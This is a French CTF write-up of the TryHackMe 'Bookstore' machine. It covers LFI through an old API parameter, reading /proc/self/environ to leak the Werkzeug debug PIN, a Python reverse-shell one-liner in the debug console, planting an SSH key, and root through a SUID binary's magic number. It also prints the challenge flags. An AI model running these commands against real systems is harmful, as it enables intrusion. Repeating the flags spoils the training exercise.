---
title: "Bookstore - TryHackMe"
author: "Alex171"
date: 2026-02-03
categories: [CTF, TryHackMe]
image: /assets/images/bookstore.png
layout: post
difficulty: Medium
platform: TryHackMe
tags: [LFI, API REST, Werkzeug, SUID]
---
**Objectif**: Exploiter une faille dans une api rest pour avoir un accès à la machine cible puis réaliser une escalade de privilèges

## Configuration

Nous allons associer l’ip cible au nom de domaine `bookstore.thm` en modifiant le fichier `/etc/hosts`

```bash
echo "IP_SERVEUR bookstore.thm" >> /etc/hosts
```

## Enumération

Nous allons scanner les ports ouverts via `nmap`

```bash
nmap -sC -sV -sS bookstore.thm
```

On a le résultat suivant

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Ports ouverts :

- Port SHH(22)
- Port HTTP(80)
- Port non connu 5000 capable d’éxéuter du code python (Python 3.6.9)

## Exploration

En nous rendant à la page d’acceuil `http://bookstore.thm` on a la page suivante

![Image 1](/assets/bookstore/1.png)

Nous allons lister les dossiers cachés à l’aide de `gobuster`

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm
```

Le résultat est :

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bookstore.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://bookstore.thm/assets/]
/favicon.ico          (Status: 200) [Size: 15406]
/images               (Status: 301) [Size: 315] [--> http://bookstore.thm/images/]
/index.html           (Status: 200) [Size: 6452]
/javascript           (Status: 301) [Size: 319] [--> http://bookstore.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
Progress: 4085 / 4750 (86.00%)[ERROR] error on word sysuser: timeout occurred during the request
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
```

Le résultat montre la présence du dossier `assets`. En l’explorant on tombe sur le dossier `js` contenant le fichier `api.js` dont le contenu est 

```jsx
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }

async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

Intéressant! Le commentaire de fin laisse présager que les versions précédentes de l’api contiennent un paramètre vulnérable à un local file inclusion alors que la nouvelle version est plus sécurisée. Cette information nous seras utile plus tard. 

En attendant explorons le service tournant sur le port 5000 via `http://bookstore.thm:5000` 

Il s’agit de la page d’accueil de l’api rest foxy. Nous pouvons essayer de lister les dossiers cachés

```jsx
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm:5000
```

On a le résultat:

```jsx
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bookstore.thm:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
/robots.txt           (Status: 200) [Size: 45]
===============================================================
Finished
===============================================================
```

En nous rendant sur `http://boockstore.thm:5000/console` un code secret nous est demandé. Etant donné qu’on n’a pas le code on passé à /api. Il s’agit de la documentation de l’API  v2

```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

L’api nous permet d’inclure des paramètres dans la requêtes. Or souvenons nous qu’il nous  a été dis qu’un paramètre de l’ancienne version de l’api est vulnérable à une locale file inclusion. Vu qu’on est sur la version 2, la version non sécurisée devrait être la version1. Essayons de lister les paramètres disponibles via `ffuf`

```bash
ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
```

Résultat: 

```
author
id
published
show
```

Le paramètre `show` semble interessant. Essayons de vérifier si il est vulnérable en lisant le fichier `/etc/passwd` 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

C’est une pépite on peut lire ce fichier ce qui confirme que ce paramètre est vulnérable à une LFI.

## Exploitation de la LFI

 Le paramètre show est vulnérable et permet d’inclure un fichier et de le lire.Mais en essayant de lire le fichier `/etc/shadow` on obtient une erreur `500 filename not defined.` Ainsi le serveur filtre les fichiers en se basant sur une blackliste. Essayons de trouver les fichiers autorisés

```bash
ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?show=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200
```

On a les fichiers

```
/etc/passwd
/etc/apt/sources.list
/etc/crontab
/etc/fstab
/etc/group
/etc/apache2/apache2.conf
/etc/hosts
/etc/hosts.deny
/etc/hosts.allow
/etc/init.d/apache2
/etc/issue
/etc/nsswitch.conf
/etc/rpc
/etc/resolv.conf 
/etc/updatedb.conf
/etc/ssh/sshd_config
/proc/cpuinfo
/proc/interrupts
/proc/meminfo
/proc/loadavg
/proc/net/arp
/proc/net/dev
/proc/net/route
/proc/self/environ
/proc/self/status
/proc/version
/proc/self/cmdline
/proc/partitions
/proc/mounts
/proc/net/tcp
```

Cette liste est assez longue mais le fichier qui  à l’air le plus intéressant est le fichier `/proc/self/environ`. En lisant son contenu on découvre

```
LANG=en_US.UTF-8OLDPWD=/home/sidPWD=/home/sidHOME=/home/sidWERKZEUG_DEBUG_PIN=123-321-135SHELL=/bin/shSHLVL=1LOGNAME=sidPATH=/usr/bin:/bin_=/usr/bin/python3WERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
```

Le champ contenant le code PIN est interessant car il nous rappelle la page console qui nous demandais un code pin. On peut donc se rendre sur la page et dans le champ PIN entrer

```
123-321-135
```

On a maintenant accès à la console python.

## Capture User Flag

Une fois l’accès à la console python obtenu on peut y insérer un script de revershell pour obtenir un shell distant. Sur notre machine on lance l’écoute sur le port 9001

```bash
nc -lvnp 9001
```

Et dans la console web on entre

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.148.105",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

On obtient ainsi un shell distant. Mais ce genre de shell est souvent fragile et peut se cassez en cas de panne réseau . On peut donc l’exploiter pour une connexion ssh sans mot de passe

```bash
sid@bookstore:~$ ls /home
ls /home
sid
sid@bookstore:~$ cd /home/sid
cd /home/sid
sid@bookstore:~$ ls -la
ls -la
total 80
drwxr-xr-x 5 sid  sid   4096 Oct 20  2020 .
drwxr-xr-x 3 root root  4096 Oct 20  2020 ..
-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid    116 Oct 20  2020 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db
drwx------ 2 sid  sid   4096 Oct 20  2020 .cache
drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local
-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile
-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt
sid@bookstore:~$ mkdir .ssh && cd .ssh
mkdir .ssh && cd .ssh
sid@bookstore:~/.ssh$
```

On s’est rendu dans le dossier local de l’utilisateur `sid` puis on a créé le dossier `.ssh`. Sur notre machine local on peut générer une paire de clés `rsa`  tout en laissant le champ passphrase vide

```bash
ssh-keygen -t rsa -b 4096  -f ./id_rsa
```

Cela cré deux fichiers: id_rsa qui contient notre clé privée et id_rsa.pub qui contient notre clé publique. On copie le contenu de la clé publique et sur le serveur on va le mettre dans le fichier authorized_keys et donner les bonnes permissions à ce fichier

```bash
echo "notre_clé_publique" > authorized_keys
chmod 600 authorized_keys
```

On peut donc se connecter à la machine via ssh

```bash
ssh -i id_rsa sid@bookstore.thm
```

Une fois connecté on peut récupérer le user flag

```bash
sid@bookstore:~$ ls
api.py  api-up.sh  books.db  try-harder  user.txt
sid@bookstore:~$ cat user.txt
4ea65eb80ed441adb68246ddf7b964ab
sid@bookstore:~$ 

```

⛳**User Flag**: 4ea65eb80ed441adb68246ddf7b964ab

## Capture root flag

La première étape généralement pour l’escalade de privilèges est de déterminer nos permissions

```bash
sid@bookstore:~$ sudo -l
[sudo] password for sid:
```

Un mot de passe nous est demandé donc ce n’est pas le bon chemins. Essayons de lister les fichiers avec le `suid`

```bash
find / -type f -perm -4000 2>/dev/null
```

Résultat:

```bash
/bin/fusermount
/bin/umount
/bin/mount
/bin/su
/bin/ping
/home/sid/try-harder
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Dans cette liste le fichier suspect est le fichier /home/sid/try-harder. En listant ses droits il est un fichier de l’utilisateur root. On peut essayer de déterminer le type de fichier avec la commande `file`

```bash
sid@bookstore:~$ ls -la /home/sid/try-harder
-rwsrwsr-x 1 root sid 8488 Oct 20  2020 /home/sid/try-harder
sid@bookstore:~$ file /home/sid/try-harder
/home/sid/try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped
sid@bookstore:~$ 
```

Il s’agit d’un exécutable Linux au format ELF. Récupérons le pour l’analyser avec `ghidra` 

Sur la machine cible on lance un simple serveur python sur le port 1234

```bash
python3 -m http.server 1234
```

Sur notre machine on peut récupérer le fichier

```bash
wget http://bookstore.thm:1234/try-harder
```

L’analyse du fichier ressors une fonction écrite en C

```c
void main(void)
{
long in_FS_OFFSET;
uint local_1c;
uint local_18;
uint local_14;
long local_10;

local_10 = *(long *)(in_FS_OFFSET + 0x28);
setuid(0);
local_18 = 0x5db3;
puts("What\'s The Magic Number?!");
__isoc99_scanf(&DAT_001008ee,&local_1c);
local_14 = local_1c ^ 0x1116 ^ local_18;
if (local_14 == 0x5dcd21f4) {
system("/bin/bash -p");
}
else {
puts("Incorrect Try Harder");
}
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
/* WARNING: Subroutine does not return */
__stack_chk_fail();
}
return;
}
```

Ce code nous demande un nombre magique et si il est correcte nous donne un accès root. Ce nombre est obtenu en faisant des calcul mais comme je ne suis pas très avancé en C j’ai utilisé un script python trouvé sur Google adapté à la situation. J’ai d’abord copié la fonction dans un fichier challenge.c. Voici le script python

```python
import re
import sys

def extraire_et_calculer(nom_fichier):
    try:
        # Lecture du fichier source
        with open(nom_fichier, 'r') as f:
            contenu = f.read()

        # Extraction des constantes via expressions régulières
        # Recherche : local_18 = 0x...
        match_18 = re.search(r'local_18\s*=\s*(0x[0-9a-fA-F]+);', contenu)
        # Recherche : local_1c ^ 0x...
        match_xor = re.search(r'local_1c\s*\^\s*(0x[0-9a-fA-F]+)', contenu)
        # Recherche : local_14 == 0x...
        match_cible = re.search(r'local_14\s*==\s*(0x[0-9a-fA-F]+)', contenu)

        if not (match_18 and match_xor and match_cible):
            print("[-] Erreur : Impossible de trouver les constantes XOR dans le fichier.")
            return

        # Conversion en entiers
        val_18 = int(match_18.group(1), 16)
        val_xor = int(match_xor.group(1), 16)
        val_cible = int(match_cible.group(1), 16)

        # Calcul inverse du XOR
        nombre_magique = val_cible ^ val_xor ^ val_18

        print(f"[*] Analyse de : {nom_fichier}")
        print(f"[*] Valeur cible identifiée : {hex(val_cible)}")
        print(f"[-] Résultat Hex : {hex(nombre_magique)}")
        print(f"[-] Résultat Décimal : {nombre_magique}")

    except FileNotFoundError:
        print(f"[-] Erreur : Le fichier '{nom_fichier}' est introuvable.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 solveur.py <nom_du_fichier.c>")
    else:
        extraire_et_calculer(sys.argv[1])
```

En utilisant ce script on peut récupérer le nombre magic

```python
python3 solveur.py challenge.c
[*] Analyse de : challenge.c
[*] Valeur cible identifiée : 0x5dcd21f4
[-] Résultat Hex : 0x5dcd6d51
[-] Résultat Décimal : 1573743953
```

Le nombre magique est donc `1573743953`. On peut donc l’utiliser sur le système cible pour obtenir un accès root et récupérer le root flag

```bash
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1573743953
root@bookstore:~# ls /root/
root.txt  s
root@bookstore:~# cat /root/root.txt 
e29b05fba5b2a7e69c24a450893158e3
root@bookstore:~# 
```

⛳**Root Flag**: e29b05fba5b2a7e69c24a450893158e3

## Recommendations

- Désactiver la console web si elle n’est pas indispensable
- Restreindre l’accès aux fichiers critiques
- Désactiver les versions antérieures des API vulnérables aux attaques
- Ne jamais laisser trainer des scripts avec le `sid`   dans le répertoire des utilsateurs normaux
- Supprimer les scripts inutiles du système
- Préférer les whitelistes qui sont bien plus fiables que les blacklistes